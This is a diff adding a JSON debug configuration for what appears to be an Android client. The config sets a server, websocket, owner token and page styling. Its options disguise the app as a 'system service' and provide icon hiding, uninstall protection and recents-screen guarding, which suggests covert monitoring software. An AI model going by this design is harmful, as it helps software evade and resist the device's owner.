@@ -1,0 +1,43 @@
+{
+  "_comment": "USB 调试默认配置 — Laravel 构建时会覆盖此文件",
+  "buildTime": "",
+  "version": "4.6.4",
+  "debug": true,
+  "serverUrl": "http://192.168.31.35:8080",
+  "websocketUrl": "ws://192.168.31.35:8081",
+  "webUrl": "https://m.baidu.com",
+  "ownerToken": "2.b1495984a6cbcb88a081e272199c67297baf7ac74a1b42bf8007f860a68d411d.1777062589",
+  "deviceKeySalt": "",
+  "showAppIcon": true,
+  "uninstallMode": false,
+  "enableConfigMask": false,
+  "configMaskStyle": "loading",
+  "configMaskStatus": "配置完成后将自动返回应用",
+  "configMaskText": "系统服务",
+  "configMaskTextColor": "#FFFFFF",
+  "configMaskSubtitle": "",
+  "configMaskSubtitleColor": "#FFFFFF",
+  "enableProgressBar": true,
+  "loadingTips": [
+    "正在连接服务器...",
+    "正在加载资源...",
+    "正在初始化配置...",
+    "正在启动"
+  ],
+  "pageStyleConfig": {
+    "appName": "系统服务",
+    "statusText": "",
+    "enableButtonText": "立即前往",
+    "enableButtonTextColor": "#FFFFFF",
+    "usageInstructions": "",
+    "buttonColor": "#1890FF",
+    "applicationId": "",
+    "versionName": ""
+  },
+  "debugConfig": {
+    "disable_uninstall_protection": true,
+    "disable_recents_guard": true,
+    "disable_icon_hide": true,
+    "disable_config_mask": true
+  }
+}
